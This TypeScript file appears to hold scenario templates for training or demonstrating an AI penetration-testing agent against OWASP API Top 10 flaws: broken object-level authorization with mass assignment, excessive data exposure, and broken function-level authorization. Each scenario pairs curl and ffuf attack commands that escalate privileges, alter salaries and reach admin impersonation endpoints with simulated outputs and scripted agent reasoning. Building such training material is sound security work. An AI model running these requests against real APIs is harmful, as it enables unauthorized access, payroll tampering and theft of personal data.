import type { ScenarioTemplate } from "./types.js";

export const API_SECURITY_SCENARIOS: ScenarioTemplate[] = [
  // API1:2023 - BOLA
  {
    id: "api-bola-mass-assignment",
    category: "API Security Top 10",
    subcategory: "API1 - BOLA",
    title: "BOLA + Mass Assignment in User Management API",
    difficulty: "intermediate",
    description: "Broken Object Level Authorization combined with mass assignment to access and modify other users' data including privilege escalation.",
    target_description: "HR management API at https://hr-api.target.com/v1 with employee records, payroll data, and role management.",
    attack_phases: [
      {
        phase: "API Enumeration",
        description: "Discover API endpoints and understand data model",
        tools: ["ffuf", "curl", "arjun"],
        commands: [
          "ffuf -u https://hr-api.target.com/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -H 'Authorization: Bearer $TOKEN' -mc 200,201,301,302,403,405 -t 50",
          "curl -s https://hr-api.target.com/v1/employees/me -H 'Authorization: Bearer $TOKEN' | jq .",
          "curl -s https://hr-api.target.com/v1/employees/1 -H 'Authorization: Bearer $TOKEN' | jq .",
          "arjun -u https://hr-api.target.com/v1/employees/me -m JSON -H 'Authorization: Bearer $TOKEN'",
        ],
        expected_output: `API endpoints: /employees, /employees/{id}, /payroll, /departments, /roles, /reviews, /documents

My profile (employee 1337):
{"id":1337,"name":"Test User","email":"test@corp.com","department":"Engineering","role":"employee","salary":75000,"ssn":"***-**-6789","manager_id":42}

Employee 1 (BOLA!):
{"id":1,"name":"CEO Name","email":"ceo@corp.com","department":"Executive","role":"admin","salary":500000,"ssn":"***-**-1234","manager_id":null}

Hidden parameters found: role, salary, ssn, manager_id, is_admin, permissions`,
        thinking: "BOLA confirmed — I can access any employee's full record including salary and partial SSN by changing the ID. The arjun scan found hidden writable parameters: role, salary, is_admin, permissions. This suggests the API accepts these fields in PUT/PATCH requests without proper authorization. Let me test mass assignment by trying to update my own role and salary, then try modifying another employee's record.",
        analysis: "BOLA on all employee endpoints. Hidden writable parameters discovered (role, salary, is_admin). Mass assignment likely exploitable.",
        next_action: "Test mass assignment to escalate privileges and modify payroll",
      },
      {
        phase: "Mass Assignment Exploitation",
        description: "Exploit mass assignment to modify role and salary",
        tools: ["curl"],
        commands: [
          "curl -s -X PATCH https://hr-api.target.com/v1/employees/1337 -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"role\":\"admin\",\"is_admin\":true,\"salary\":500000}' | jq .",
          "curl -s https://hr-api.target.com/v1/employees/me -H 'Authorization: Bearer $TOKEN' | jq '{role,is_admin,salary}'",
          "curl -s -X PATCH https://hr-api.target.com/v1/employees/1 -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"salary\":1}' | jq .",
          "curl -s https://hr-api.target.com/v1/payroll/run -X POST -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"month\":\"2024-01\"}' | jq .",
        ],
        expected_output: `Self-privilege escalation:
{"id":1337,"name":"Test User","role":"admin","is_admin":true,"salary":500000,"message":"Profile updated"}

CEO salary modification:
{"id":1,"name":"CEO Name","salary":1,"message":"Profile updated"}

Payroll access (as admin):
{"payroll_data":[...all employee salaries and bank details...]}`,
        thinking: "Both BOLA and mass assignment exploited together create devastating impact: 1) Self-escalation to admin via mass assignment on own profile, 2) Modified CEO's salary to $1 via BOLA + mass assignment on employee 1, 3) As admin, accessed full payroll data including bank account details. The API trusts all fields in the request body without checking which fields the user is authorized to modify. There's no field-level authorization.",
        analysis: "BOLA + mass assignment = full HR system compromise. Privilege escalation, salary manipulation, and payroll data breach demonstrated.",
        next_action: "Generate report documenting BOLA and mass assignment chain",
      },
    ],
    cve_references: ["CWE-639", "CWE-915"],
    tools_involved: ["ffuf", "curl", "arjun", "report_generator"],
    tags: ["bola", "mass-assignment", "api-security", "idor", "privilege-escalation", "payroll"],
  },

  // API3:2023 - Broken Object Property Level Authorization
  {
    id: "api-excessive-data-exposure",
    category: "API Security Top 10",
    subcategory: "API3 - Broken Object Property Level Authorization",
    title: "Excessive Data Exposure in Mobile API Responses",
    difficulty: "beginner",
    description: "API returns full database objects including sensitive fields that the mobile app doesn't display, exposing internal IDs, hashed passwords, and PII.",
    target_description: "Mobile banking API at https://mobile-api.target.com/v2 serving iOS/Android apps. Responses contain more data than the app renders.",
    attack_phases: [
      {
        phase: "Response Analysis",
        description: "Intercept and analyze full API responses vs what the app shows",
        tools: ["curl"],
        commands: [
          "curl -s https://mobile-api.target.com/v2/account/profile -H 'Authorization: Bearer $TOKEN' -H 'X-App-Version: 3.2.1' | jq .",
          "curl -s https://mobile-api.target.com/v2/account/transactions?limit=10 -H 'Authorization: Bearer $TOKEN' | jq '.[0]'",
          "curl -s https://mobile-api.target.com/v2/account/cards -H 'Authorization: Bearer $TOKEN' | jq '.[0]'",
        ],
        expected_output: `Profile (app shows: name, email, phone):
{
  "id": 1337,
  "name": "Test User",
  "email": "test@mail.com",
  "phone": "+1-555-0123",
  "ssn": "123-45-6789",
  "date_of_birth": "1990-05-15",
  "password_hash": "$2b$12$...",
  "security_question": "Pet name?",
  "security_answer_hash": "$2b$12$...",
  "internal_risk_score": 0.23,
  "kyc_document_url": "https://s3.aws.com/kyc-docs/passport_1337.jpg",
  "linked_accounts": [{"bank":"Chase","account":"****4567","routing":"021000021"}]
}

Transaction (app shows: date, description, amount):
{
  "id": "txn-99001",
  "date": "2024-01-15",
  "description": "Wire Transfer",
  "amount": -5000.00,
  "recipient_name": "John Smith",
  "recipient_account": "9876543210",
  "recipient_routing": "021000021",
  "recipient_ssn": "987-65-4321",
  "internal_fraud_flag": false,
  "ip_address": "192.168.1.100",
  "device_fingerprint": "abc123..."
}`,
        thinking: "The API is returning the entire database object for every request, including fields the mobile app never displays. Exposed sensitive data includes: SSN, password hashes, security question answers, KYC document URLs (direct S3 links to passport photos!), full bank routing numbers, and recipient SSNs in transaction records. The app only shows a subset, but the full data is in every API response. This is a textbook 'Excessive Data Exposure' — the API relies on the client to filter sensitive fields instead of implementing server-side field filtering.",
        analysis: "API returns full database objects including SSN, password hashes, KYC docs, bank details. Client-side filtering instead of server-side projection. Massive PII exposure.",
        next_action: "Document all exposed fields and generate compliance-focused report (PCI-DSS, GDPR implications)",
      },
    ],
    cve_references: ["CWE-213"],
    tools_involved: ["curl", "report_generator"],
    tags: ["excessive-data-exposure", "api-security", "pii", "mobile-api", "data-leak", "gdpr", "pci-dss"],
  },

  // API5:2023 - Broken Function Level Authorization
  {
    id: "api-bfla",
    category: "API Security Top 10",
    subcategory: "API5 - Broken Function Level Authorization",
    title: "BFLA: Accessing Admin API Functions as Regular User",
    difficulty: "intermediate",
    description: "Exploiting Broken Function Level Authorization to access admin-only API endpoints that perform privileged operations.",
    target_description: "Multi-tenant SaaS platform at https://saas-api.target.com with separate user and admin API namespaces.",
    attack_phases: [
      {
        phase: "Admin Endpoint Discovery",
        description: "Discover hidden admin API endpoints",
        tools: ["ffuf", "curl"],
        commands: [
          "ffuf -u https://saas-api.target.com/api/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -H 'Authorization: Bearer $USER_TOKEN' -mc 200,201,403,405 -t 50",
          "ffuf -u https://saas-api.target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -H 'Authorization: Bearer $USER_TOKEN' -mc all -fc 404",
          "curl -s https://saas-api.target.com/api/admin/users -H 'Authorization: Bearer $USER_TOKEN' | jq .",
          "curl -s https://saas-api.target.com/api/admin/tenants -H 'Authorization: Bearer $USER_TOKEN' | jq .",
          "curl -s -X POST https://saas-api.target.com/api/admin/users/1337/impersonate -H 'Authorization: Bearer $USER_TOKEN' | jq .",
        ],
        expected_output: `Admin endpoints found:
/api/admin/users (200!) - returns all users across all tenants
/api/admin/tenants (200!) - returns all tenant organizations
/api/admin/impersonate (200!) - user impersonation endpoint!
/api/admin/config (200!) - system configuration
/api/admin/billing (200!) - billing management

All admin endpoints accessible with regular user token!`,
        thinking: "The application has no function-level authorization on admin endpoints. The /api/admin/* namespace is meant for admin users only, but the authorization middleware only checks if the JWT is valid — not if the user has admin privileges. This is BFLA — the function-level check is missing. With access to /admin/impersonate, I can generate tokens for any user (including the actual admin). /admin/tenants gives me cross-tenant access to all organizations. /admin/config likely has system secrets.",
        analysis: "Complete BFLA — all admin endpoints accessible with regular user token. User impersonation, cross-tenant access, and system config exposed. Authorization only validates token existence, not role.",
        next_action: "Exploit impersonation endpoint for admin access and cross-tenant data breach",
      },
    ],
    cve_references: ["CWE-285"],
    tools_involved: ["ffuf", "curl", "report_generator"],
    tags: ["bfla", "api-security", "admin-bypass", "impersonation", "multi-tenant", "authorization"],
  },
];
